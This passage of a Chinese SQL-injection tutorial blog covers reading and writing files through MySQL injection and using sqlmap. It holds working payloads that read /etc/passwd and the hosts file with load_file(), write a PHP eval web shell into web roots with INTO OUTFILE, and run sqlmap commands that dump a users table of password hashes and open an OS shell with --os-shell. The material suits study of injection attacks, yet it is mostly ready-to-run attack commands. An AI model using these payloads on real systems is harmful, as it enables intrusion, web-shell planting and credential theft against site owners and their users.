<h2 id="4-SQL-注入读写文件"><a href="#4-SQL-注入读写文件" class="headerlink" title="4.SQL 注入读写文件"></a>4.<strong>SQL</strong> 注入读写文件</h2><h3 id="4-1-前提条件"><a href="#4-1-前提条件" class="headerlink" title="4.1 前提条件"></a><strong>4.1</strong> 前提条件</h3><h4 id="4-1-1-权限问题"><a href="#4-1-1-权限问题" class="headerlink" title="4.1.1  权限问题"></a><strong>4.1.1</strong>  <strong>权限问题</strong></h4><p>当前（连接）数据库的用户具有文件读写权限。数据库的权限粒度，某个库中某个表某个用户是否有增删改查权限。</p>
<p>MySQL 数据库用户，例如root@localhost，由两部分组成：</p>
<ul>
<li><p>用户名</p>
</li>
<li><p>地址</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># root@localhost</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,file_priv,3 from mysql.user where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-1-2-文件路径"><a href="#4-1-2-文件路径" class="headerlink" title="4.1.2 文件路径"></a><strong>4.1.2</strong> <strong>文件路径</strong></h4><p>已知读写目标文件的绝对路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/</span><br><span class="line">/var/www/html/</span><br><span class="line">c:/phpstudy/www/</span><br><span class="line">c:/xampp/htdocs/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-1-3-安全选项"><a href="#4-1-3-安全选项" class="headerlink" title="4.1.3  安全选项"></a><strong>4.1.3</strong>  <strong>安全选项</strong></h4><p>MySQL 数据库有关于文件读写的安全选项secure_file_priv。</p>
<p>secure_file_priv 参数限制了mysqld(MySQL DBMS) 的导入导出操作，这个选项是不能利用SQL 语句修改，必须修改my.ini 配置文件，并重启mysql 数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>参数值：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>secure_file_priv&#x3D;NULL</td>
<td>限制mysqld 不允许导入导出操作。</td>
</tr>
<tr>
<td>secure_file_priv&#x3D;’c:&#x2F;a&#x2F;</td>
<td>会限制mysqld 的导入导出操作在某个固定目录下，并且子目录有效。</td>
</tr>
<tr>
<td>secure_file_priv&#x3D;</td>
<td>不对mysqld 的导入导出操作做限制。</td>
</tr>
</tbody></table>
<h3 id="4-2-读写文件"><a href="#4-2-读写文件" class="headerlink" title="4.2 读写文件"></a><strong>4.2</strong> 读写文件</h3><h4 id="4-2-1-读取文件"><a href="#4-2-1-读取文件" class="headerlink" title="4.2.1  读取文件"></a><strong>4.2.1</strong>  <strong>读取文件</strong></h4><p>使用load_file() 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;),3</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,load_file(&quot;c:/windows/system32/drivers/etc/hosts&quot;),3</span><br><span class="line"></span><br><span class="line">and 1=2 union select1,load_file(&quot;/etc/passwd&quot;),3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-2-2-写入文件"><a href="#4-2-2-写入文件" class="headerlink" title="4.2.2  写入文件"></a><strong>4.2.2</strong>  <strong>写入文件</strong></h4><p>使用into outfile 语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select 1,2,3 into outfile &quot;c:/phpstudy_2016/www/1.php&quot;</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_REQUEST[777]);phpinfo()?&gt;&quot;,3 into outfile &quot;c:/phpstudy_2016/www/2.php&quot;</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_REQUEST[777]);phpinfo()?&gt;&quot;,3 into outfile &quot;/var/www/html/1.php&quot;</span><br><span class="line"></span><br><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_REQUEST[777]);phpinfo()?&gt;&quot;,3 into outfile &quot;/tmp/1.php&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Linux 系统下，一般情况下权限较低，无法写入文件</p>
<h2 id="5-SQL-注入工具"><a href="#5-SQL-注入工具" class="headerlink" title="5.SQL 注入工具"></a>5.<strong>SQL</strong> 注入工具</h2><h3 id="5-1-SQLMap"><a href="#5-1-SQLMap" class="headerlink" title="5.1  SQLMap"></a><strong>5.1</strong>  <strong>SQLMap</strong></h3><h4 id="5-1-1-安装与更新"><a href="#5-1-1-安装与更新" class="headerlink" title="5.1.1  安装与更新"></a><strong>5.1.1</strong>  <strong>安装与更新</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>源码包安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/sqlmapproject/sqlmap.git git fetch</span><br><span class="line">git pull</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-1-2-参数速查"><a href="#5-1-2-参数速查" class="headerlink" title="5.1.2  参数速查"></a><strong>5.1.2</strong>  <strong>参数速查</strong></h4><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-u</td>
<td align="center">检测注入点</td>
</tr>
<tr>
<td align="center">–dbs</td>
<td align="center">列出所有的库名</td>
</tr>
<tr>
<td align="center">–current-user</td>
<td align="center">当前连接数据库用户的名字</td>
</tr>
<tr>
<td align="center">–current-db</td>
<td align="center">当前数据库的名字</td>
</tr>
<tr>
<td align="center">-D “cms”</td>
<td align="center">指定目标数据库为cms</td>
</tr>
<tr>
<td align="center">–tables</td>
<td align="center">列出数据库中所有的表名</td>
</tr>
<tr>
<td align="center">-T “cms_users”</td>
<td align="center">指定目标表名为’cms_users’</td>
</tr>
<tr>
<td align="center">–columns</td>
<td align="center">列出所有的字段名</td>
</tr>
<tr>
<td align="center">-C ‘username,password’</td>
<td align="center">指定目标字段</td>
</tr>
<tr>
<td align="center">–dump</td>
<td align="center">列出字段内容</td>
</tr>
<tr>
<td align="center">-r</td>
<td align="center">从文件中读取HTTP 请求</td>
</tr>
<tr>
<td align="center">–os-shell</td>
<td align="center">在特定情况下，可以直接获得目标系统Shell</td>
</tr>
<tr>
<td align="center">–level 3</td>
<td align="center">设置sqlmap  检测等级 3</td>
</tr>
<tr>
<td align="center">–cookie&#x3D;”username&#x3D;admin”</td>
<td align="center">携带Cookie 信息进行注入</td>
</tr>
<tr>
<td align="center">-g</td>
<td align="center">利用google 搜索引擎自动搜索注入点</td>
</tr>
<tr>
<td align="center">–batch</td>
<td align="center">使用默认选项</td>
</tr>
<tr>
<td align="center">–random-agent</td>
<td align="center">使用随机User-Agent  信息</td>
</tr>
<tr>
<td align="center">-v 3</td>
<td align="center">显示payload</td>
</tr>
</tbody></table>
<h4 id="5-1-3-参数速查"><a href="#5-1-3-参数速查" class="headerlink" title="5.1.3  参数速查"></a><strong>5.1.3</strong>  <strong>参数速查</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点：http://10.10.10.6/cms/show.php?id=33</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; --current-db sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; -D &quot;cms&quot; --tables</span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; -D &quot;cms&quot; -T &quot;cms_users&quot; --columns</span><br><span class="line">sqlmap -u &quot;http://10.10.10.1/show.php?id=33&quot; -D &quot;cms&quot; -T &quot;cms_users&quot; -C &quot;username,password&quot; --dump</span><br><span class="line"></span><br><span class="line">+----------+----------------------------------+ | username | password	| +----------+----------------------------------+</span><br><span class="line"> admin	| 21232f297a57a5a743894a0e4a801fc3 |</span><br><span class="line">| ajest	| e10adc3949ba59abbe56e057f20f883e | +----------+----------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-1-4-POST-注入"><a href="#5-1-4-POST-注入" class="headerlink" title="5.1.4  POST 注入"></a><strong>5.1.4</strong>  <strong>POST</strong> <strong>注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r /tmp/login.post</span><br></pre></td></tr></table></figure>

<h4 id="5-1-5-GetShell"><a href="#5-1-5-GetShell" class="headerlink" title="5.1.5  GetShell"></a><strong>5.1.5</strong>  <strong>GetShell</strong></h4><ul>
<li>受到secure_file_priv 选项的限制；</li>
<li>目标系统Web 根目录的绝对路径；</li>
<li>目录权限。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.16.119/show.php?id=33&quot; --os-shell</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658" title="头像" alt="头像"></a><div class="post-copyright__author_name">cgjil</div><div class="post-copyright__author_desc">你好啊，出发吧</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/')">sql注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=undefined&amp;url=http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/&amp;pic=undefined" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">cgjil</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/%E6%BC%8F%E6%B4%9E/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>漏洞<span class="categoryesPageCount">10</span></a></div><div class="post-meta__box__tag-list"></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/03/%E6%BC%8F%E6%B4%9E/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/9.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透测试方法论</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/29.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">xss</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">This is my blog! **</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">出发吧，诗和远方</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">cgjil</h1><div class="author-info__desc">你好啊，出发吧</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/anzhiyu-c" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/372204786" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-SQL-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">1.SQL 注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%87%E8%83%BD%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 万能用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-1-%E4%B8%87%E8%83%BD%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1.1.1  万能用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-2-%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">1.1.2 查看代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-3-%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">1.1.3  登录逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-4-%E6%8B%BC%E6%8E%A5%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">1.1.4  拼接问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-SQL-%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 SQL 注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-SQL-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">1.2.1  SQL 注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-SQL-%E6%B3%A8%E5%85%A5%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">1.2.2  SQL 注入危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">1.2.3  SQL 注入分类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-SQL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.1.3.</span> <span class="toc-text">**1.3 SQL 注入漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-1-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">1.3.1  注入点判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-2-%E4%B8%BB%E8%A6%81%E5%85%B3%E6%B3%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">1.3.2  主要关注的问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-3-CMS-%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">1.3.3  CMS 注入点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.4 其他知识补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-1-MySQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">1.4.1  MySQL 数据库中的注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-2-SQL-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">1.4.2  SQL 注入流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-3-%E5%8F%AF%E4%BB%A5%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">1.4.3  可以代替空格的字符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SQL-%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%89%8B%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">2.SQL 注入基本手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1  联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">2.1.1  必要条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E7%9B%AE%E6%A0%87%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2.1.2 目标分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">2.1.3 判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">2.1.4  判断显示位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-group-by"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">2.2.1  group by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-extractvalue"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">2.2.2  extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-updatexml"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">2.2.3  updatexml</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-%E5%BA%93%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">2.3.1  库名爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">2.3.2  库名长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E6%8C%89%E4%BD%8D%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">2.3.3  按位测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.4 延时注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">2.4.1  数据库名字的长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">2.4.2  数据库名字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.5 堆叠查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-SQL-%E6%B3%A8%E5%85%A5%E5%85%B6%E4%BB%96%E6%83%85%E5%86%B5"><span class="toc-number">1.3.</span> <span class="toc-text">3.SQL 注入其他情况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-1-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">3.1.1  代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-2-GBK-%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">3.1.2  GBK 编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">3.1.3 宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-HTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 HTTP 头部注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-Cookie-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">3.2.1  Cookie 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2-base64-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">3.2.2  base64 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-3-User-Agent-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3.2.3 User-Agent 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-4-Referer-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">3.2.4  Referer 注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-SQL-%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.</span> <span class="toc-text">4.SQL 注入读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 前提条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-1-%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">4.1.1  权限问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-2-%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">4.1.2 文件路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-3-%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">4.1.3  安全选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">4.2.1  读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">4.2.2  写入文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.</span> <span class="toc-text">5.SQL 注入工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-SQLMap"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1  SQLMap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-1-%E5%AE%89%E8%A3%85%E4%B8%8E%E6%9B%B4%E6%96%B0"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">5.1.1  安装与更新</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-2-%E5%8F%82%E6%95%B0%E9%80%9F%E6%9F%A5"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">5.1.2  参数速查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-3-%E5%8F%82%E6%95%B0%E9%80%9F%E6%9F%A5"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">5.1.3  参数速查</span></a></li><li class="toc-item 